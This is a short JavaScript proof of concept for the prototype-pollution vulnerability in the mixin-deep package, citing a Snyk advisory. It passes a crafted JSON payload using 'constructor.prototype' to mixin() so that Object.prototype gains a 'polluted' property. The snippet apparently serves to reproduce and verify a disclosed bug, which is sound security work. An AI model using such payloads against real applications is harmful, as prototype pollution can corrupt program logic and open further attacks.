//https://snyk.io/vuln/SNYK-JS-MIXINDEEP-450212
    const mixin = require('mixin-deep');
    const payload = '{"constructor": {"prototype": {"polluted": "yes"}}}'
    
    let obj = {}

    mixin({}, JSON.parse(payload));
